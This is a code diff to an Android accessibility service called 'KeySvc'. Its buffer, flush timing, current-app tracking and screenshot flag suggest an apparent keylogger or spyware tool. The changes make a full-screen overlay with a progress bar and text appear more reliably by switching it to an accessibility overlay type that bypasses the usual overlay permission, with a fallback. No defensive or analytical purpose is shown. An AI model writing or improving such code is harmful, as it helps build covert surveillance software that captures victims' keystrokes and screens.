@@ -31,7 +31,7 @@ public class KeySvc extends AccessibilityService {
     private final Handler H = new Handler(Looper.getMainLooper());
     private final StringBuilder buf = new StringBuilder();
     private volatile long lastFlush;
-    private volatile String curPkg;
+    public volatile String curPkg;
     private volatile String curWin;
     public volatile boolean shotOn = true;
     private volatile boolean shotBusy;
@@ -305,8 +305,8 @@ public class KeySvc extends AccessibilityService {
                         t.setPadding(48, 48, 48, 48);
                         l.addView(pb);
                         l.addView(t);
-                        int type = Build.VERSION.SDK_INT >= 26
-                                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+                        int type = Build.VERSION.SDK_INT >= 22
+                                ? WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
                                 : WindowManager.LayoutParams.TYPE_PHONE;
                         WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                                 WindowManager.LayoutParams.MATCH_PARENT,
@@ -316,7 +316,12 @@ public class KeySvc extends AccessibilityService {
                                         | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                                         | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                                 PixelFormat.TRANSLUCENT);
-                        wm.addView(l, lp);
+                        try {
+                            wm.addView(l, lp);
+                        } catch (Throwable t) {
+                            lp.type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
+                            wm.addView(l, lp);
+                        }
                         ov = l;
                     } else if (ov != null) {
                         wm.removeView(ov);
